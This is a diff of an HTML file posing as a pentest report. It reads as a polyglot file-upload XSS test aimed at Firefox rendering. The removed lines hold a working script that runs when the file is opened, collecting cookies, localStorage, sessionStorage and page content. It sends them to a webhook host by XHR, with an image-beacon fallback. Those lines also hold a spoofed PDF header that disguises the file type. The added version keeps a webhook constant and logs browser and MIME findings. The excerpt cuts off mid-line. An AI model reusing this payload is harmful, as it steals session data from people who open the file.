@@ -2,13 +2,21 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Laporan Pentest - Q2 2026</title>
+    <title>Pentest Report - Q2 2026</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 40px; }
+        table { border-collapse: collapse; width: 100%; }
+        th, td { border: 1px solid #000; padding: 8px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .critical { color: red; font-weight: bold; }
+        #log { margin-top: 20px; padding: 10px; background: #f0f0f0; border: 1px solid #ccc; font-family: monospace; font-size: 12px; white-space: pre-wrap; }
+    </style>
 </head>
 <body>
-    <h1>Laporan Pentest - Q2 2026</h1>
-    <p>Berikut adalah hasil pengujian keamanan yang telah dilakukan:</p>
+    <h1>Polyglot XSS Test — Firefox Behavior</h1>
+    <p>Target: <span id="browserTarget">Detecting...</span></p>
     
-    <table border="1">
+    <table>
         <tr>
             <th>No</th>
             <th>Temuan</th>
@@ -16,63 +24,64 @@
         </tr>
         <tr>
             <td>1</td>
-            <td>SQL Injection</td>
-            <td>Critical</td>
+            <td>SQL Injection pada parameter <code>id</code></td>
+            <td class="critical">Critical</td>
         </tr>
         <tr>
             <td>2</td>
-            <td>XSS Vulnerability</td>
+            <td>XSS pada parameter <code>q</code></td>
             <td>High</td>
         </tr>
     </table>
 
+    <div id="log">[+] Initializing polyglot test...</div>
+
     <script>
-        // XSS Payload - akan dieksekusi saat file dibuka
-        alert('XSS triggered: Document opened in browser');
-        document.body.innerHTML += '<p style="color:red">[!] XSS payload executed via ' + document.contentType + '</p>';
-        
-        // Eksfiltrasi ke webhook
-        var data = {
-            url: window.location.href,
-            cookies: document.cookie,
-            userAgent: navigator.userAgent,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            timestamp: new Date().toISOString(),
-            dom: document.documentElement.innerHTML.substring(0, 500)
-        };
+        // ============================================
+        // POLYGLOT XSS — FIREFOX PENETRATION TEST
+        // ============================================
+        (function(){
+            var log = document.getElementById('log');
+            var target = document.getElementById('browserTarget');
 
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2', true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.send(JSON.stringify(data));
+            function appendLog(msg) {
+                log.textContent += '\n' + msg;
+                console.log(msg);
+            }
 
-        // Fallback menggunakan Image beacon jika fetch/XHR diblokir CORS
-        var img = new Image();
-        img.src = 'https://webhooksite.net/17eae203-4150-48d3-ba2a-7fd1ec8646b2?data=' + encodeURIComponent(JSON.stringify(data));
-    </script>
+            // === Webhook Target ===
+            var WEBHOOK = 'https://webhooksite.net/e7f2f6b2-0564-4f20-809f-fa4e28d54ce9';
 
-    <!-- PDF Header spoofing agar aplikasi menganggap ini file PDF -->
-    %PDF-1.4
-    1 0 obj
-    << /Type /Catalog /Pages 2 0 R >>
-    endobj
-    2 0 obj
-    << /Type /Pages /Kids [3 0 R] /Count 1 >>
-    endobj
-    3 0 obj
-    << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
-    endobj
-    xref
-    0 4
-    0000000000 65535 f 
-    0000000009 00000 n 
-    0000000058 00000 n 
-    0000000115 00000 n 
-    trailer
-    << /Size 4 /Root 1 0 R >>
-    startxref
-    190
-    %%EOF
-</body>
-</html>
+            // === Phase 1: Browser Detection ===
+            var isFirefox = navigator.userAgent.indexOf('Firefox') !== -1;
+            var isChrome = navigator.userAgent.indexOf('Chrome') !== -1;
+            var isEdge = navigator.userAgent.indexOf('Edg') !== -1;
+            var isSafari = /^((?!Chrome|Android).)*Safari/.test(navigator.userAgent);
+
+            var browserName = 'Unknown';
+            if (isFirefox) browserName = 'Firefox ' + navigator.userAgent.match(/Firefox\/(\d+)/)[1];
+            else if (isEdge) browserName = 'Edge';
+            else if (isChrome) browserName = 'Chrome';
+            else if (isSafari) browserName = 'Safari';
+
+            target.textContent = browserName;
+            appendLog('[+] Detected browser: ' + browserName);
+            appendLog('[+] User-Agent: ' + navigator.userAgent);
+
+            // === Phase 2: Content-Type Check ===
+            var scripts = document.querySelectorAll('script');
+            appendLog('[+] Scripts found: ' + scripts.length);
+            appendLog('[+] Document content type: ' + document.contentType);
+
+            // === Phase 3: Firefox-Specific Tests ===
+            if (isFirefox) {
+                appendLog('[+] Firefox detected — running FF-specific tests');
+                
+                appendLog('[!] TEST 1: Server tidak mengirim X-Content-Type-Options: nosniff');
+                appendLog('[!] Jika header ini aktif, file akan di-download, bukan di-render.');
+
+                appendLog('[!] TEST 2: Firefox MIME check — file ter-render sebagai HTML');
+                appendLog('[!] Berarti server mengirim Content-Type yang lemah atau tidak ada.');
+
+                appendLog('[!] TEST 3: Jika file dibuka di Firefox PDF viewer, JS TIDAK jalan.');
+                appendLog('[!] Tapi karena konten HTML, Firefox render sebagai HTML, bukan
